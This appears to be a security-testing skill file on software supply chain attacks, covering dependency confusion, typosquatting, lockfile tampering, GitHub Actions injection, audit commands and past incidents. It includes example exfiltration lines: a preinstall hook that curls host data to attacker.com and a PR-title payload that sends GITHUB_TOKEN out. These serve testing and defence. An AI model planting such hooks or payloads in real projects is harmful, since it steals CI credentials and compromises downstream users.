---
name: supply_chain
description: Software supply chain attack testing covering dependency confusion, typosquatting, compromised pipelines, and SBOM analysis (OWASP A03:2025)
mitre_techniques: [T1195, T1195.002]
kill_chain_phases: [initial_access]
---

# Software Supply Chain Failures

OWASP A03:2025. Attacks that compromise software before it reaches production by targeting dependencies, build systems, package registries, and CI/CD pipelines. A single poisoned package can propagate to thousands of downstream consumers.

## Attack Surface

**Package Registries**
- Public registries: npm, PyPI, RubyGems, crates.io, Maven Central, NuGet, Go modules
- Private/internal registries: Artifactory, Nexus, GitHub Packages, AWS CodeArtifact
- Registry priority and resolution order between public and private sources

**Build Pipelines**
- CI/CD systems: GitHub Actions, GitLab CI, Jenkins, CircleCI, Azure DevOps
- Build scripts, Makefiles, post-install hooks
- Container image builds, base image provenance

**Lockfiles & Manifests**
- package-lock.json, yarn.lock, pnpm-lock.yaml, Pipfile.lock, Gemfile.lock, go.sum, Cargo.lock
- Manifest files defining version ranges and sources

## Key Vulnerabilities

### Dependency Confusion

Internal package names resolved from public registries due to misconfigured scoping:
```bash
# Enumerate internal package names from leaked manifests, error messages, or JS source maps
# Register higher-version package on public registry with preinstall hook
# package.json preinstall hook exfiltrates environment:
"scripts": { "preinstall": "curl https://attacker.com/exfil?host=$(hostname)&dir=$(pwd)" }
```

Test for vulnerable resolution:
```bash
# Check if private registry is configured as exclusive source
npm config get registry
cat .npmrc | grep registry
pip config list | grep index-url
cat pip.conf
```

### Typosquatting

Register packages with near-miss names targeting popular libraries:
```
# npm examples
lodash → 1odash, lodash4, lodashs, lodaash
express → expresss, expres, express-js
# PyPI examples
requests → reqeusts, request, python-requests
urllib3 → urllib, urlib3
```

Audit installed packages against known-good names:
```bash
# Check for suspicious packages in node_modules
npm ls --all | sort > installed.txt
# Compare against expected dependency tree
npm ls --all --package-lock-only | sort > expected.txt
diff installed.txt expected.txt

# PyPI typosquatting check
pip list --format=json | python3 -c "import sys,json; [print(p['name']) for p in json.load(sys.stdin)]" | sort > installed_pip.txt
```

### Lockfile Manipulation

Attackers modify lockfiles in PRs to point resolved URLs to malicious registries:
```bash
# Detect lockfile integrity issues
npm ci  # Fails if lockfile doesn't match package.json - always use ci in CI
# Verify lockfile hasn't been tampered with
git diff HEAD~1 -- package-lock.json | grep '"resolved"'
git diff HEAD~1 -- package-lock.json | grep '"integrity"'

# Check for registry mismatches in lockfile
grep -E '"resolved":\s*"https?://(?!registry\.npmjs\.org)' package-lock.json
```

### CI/CD Poisoning

GitHub Actions injection via untrusted input:
```yaml
# VULNERABLE: PR title injected into shell
- run: echo "PR title is ${{ github.event.pull_request.title }}"
# Attacker PR title: "; curl https://attacker.com/exfil?token=$GITHUB_TOKEN #

# SAFE: Use intermediate env var
- run: echo "PR title is $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

Check for workflow injection points:
```bash
# Audit GitHub Actions for dangerous contexts
grep -rn 'github\.event\.' .github/workflows/ | grep -E '\$\{\{.*github\.event\.(pull_request\.(title|body|head\.ref)|issue\.(title|body)|comment\.body|review\.body)'
# Check for pull_request_target with checkout of PR code
grep -A5 'pull_request_target' .github/workflows/*.yml | grep 'ref.*head'
```

### Malicious Packages & Hooks

```bash
# Audit npm install scripts
npm query ':attr(scripts, [preinstall]), :attr(scripts, [postinstall]), :attr(scripts, [install])' 2>/dev/null
# Or manually check
find node_modules -name package.json -exec grep -l '"preinstall"\|"postinstall"\|"install"' {} \;

# Check Python setup.py for code execution during install
grep -rn 'cmdclass\|setup(\|subprocess\|os.system\|exec(' setup.py setup.cfg
```

### Compromised Build Pipelines

```bash
# Verify build artifact provenance
cosign verify-attestation --type slsaprovenance <image>
# Check for unsigned commits in dependency updates
git log --show-signature -- package-lock.json yarn.lock
```

## Real-World Incidents

- **event-stream (2018)**: Maintainer transferred ownership; new owner added flatmap-stream with Bitcoin wallet stealer in minified code
- **ua-parser-js (2021)**: Compromised maintainer account pushed cryptominer in postinstall hook to 8M weekly downloads
- **colors.js / faker.js (2022)**: Maintainer intentionally corrupted packages with infinite loop, broke thousands of projects
- **codecov (2021)**: Bash uploader script modified to exfiltrate CI environment variables including tokens and keys
- **SolarWinds (2020)**: Build pipeline compromised to inject backdoor into signed software updates

## Tools & Testing

```bash
# Dependency vulnerability scanning
npm audit --json
pip-audit --format=json
trivy fs --scanners vuln .
snyk test --all-projects

# SBOM generation and analysis
syft . -o spdx-json > sbom.json
trivy sbom sbom.json
grype sbom:sbom.json

# Socket.dev for supply chain specific risks
# Detects install scripts, network access, filesystem access, obfuscated code
npx socket:cli report create .

# Check for unpinned dependencies
grep -E '"\^|"~|"\*|">=' package.json
grep -vE '==' requirements.txt | grep -v '^#' | grep -v '^$'

# Verify package signature/provenance (npm)
npm audit signatures

# Enumerate transitive dependencies
npm ls --all --depth=Infinity
pip show <package> | grep Requires
```

## Testing Methodology

1. **Inventory** - Generate SBOM, map all direct and transitive dependencies
2. **Registry config** - Verify private registry scoping, check .npmrc/.pypirc for exclusive source configuration
3. **Lockfile audit** - Verify all resolved URLs point to expected registries, check integrity hashes
4. **Dependency confusion** - Identify internal package names, test if public registry takes priority
5. **Install hooks** - Audit all pre/post install scripts in dependency tree
6. **CI/CD review** - Audit workflow files for injection via untrusted event data, check secret exposure
7. **Pinning** - Verify all dependencies use exact versions, lockfiles are committed and enforced
8. **Signature verification** - Check for package provenance attestations and signed commits

## Validation

- Demonstrate dependency confusion by showing resolution order favors public registry for internal names
- Show unpinned or loosely pinned dependencies that accept arbitrary future versions
- Identify install hooks in transitive dependencies that execute arbitrary code
- Prove CI/CD injection by showing untrusted input flows into shell execution contexts
- Document lockfile inconsistencies where resolved URLs diverge from expected registries

## Impact

- Arbitrary code execution during install or build on developer machines and CI servers
- Credential theft from CI/CD environments (tokens, cloud keys, signing keys)
- Backdoor injection into production artifacts affecting all downstream consumers
- Cryptominer deployment across development and production infrastructure
